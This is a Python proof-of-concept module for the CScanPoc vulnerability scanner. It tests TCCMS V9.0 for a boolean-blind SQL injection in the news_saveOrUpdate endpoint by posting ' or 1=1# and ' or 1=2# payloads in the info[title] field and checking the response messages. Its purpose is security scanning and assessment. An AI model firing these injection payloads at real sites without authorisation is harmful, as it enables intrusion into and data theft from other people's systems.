# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re
import hashlib


class Vuln(ABVuln):
    vuln_id = 'TCCMS_0001'  # 平台漏洞编号，留空
    name = 'TCCMSV9.0 最新版多处sql注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-06-30'  # 漏洞公布时间
    desc = '''
        TCCMS是一款具有良好的扩展性、安全、高效的内容管理系统。其核心框架TC，具备大数据量,高并发,易扩展等特点。
        TCCMS V9.0 在app/controller/news.class.php中。
        程序从$_POST['info'] 逐一获取了key/value的值，并最终保存为$this->$key =$value。并且在中间过程中做了html编码，并没有做转义就带入到了sql语句中执行了。
        可以使用boolen型盲注,当sql语句获取到数据的时候会提示title已经存在，利用这个可以很方便的进行sql注入。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3203/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'TCCMS'  # 漏洞应用名称
    product_version = 'V9.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'd5841386-ee6b-43c6-99a3-5524dbe1ffaa'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-09'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = '/index.php?ac=news_saveOrUpdate'
            data1 = '''info[title]=' or 1=2%23&info[pid]=1&info[photo_s]=234&info[photo]=&info[smallmemo]=23&smallpic=1&smallmemo=1&info[id]=&info[content]=<p>234<br/></p>'''
            data2 = '''info[title]=' or 1=1%23&info[pid]=1&info[photo_s]=234&info[photo]=&info[smallmemo]=23&smallpic=1&smallmemo=1&info[id]=&info[content]=<p>234<br/></p>'''
            url = self.target + payload

            r1 = requests.post(url, data=data1)
            if '添加成功' in r1.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

            r2 = requests.post(url, data=data2)
            if '标题不能重复' in r2.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
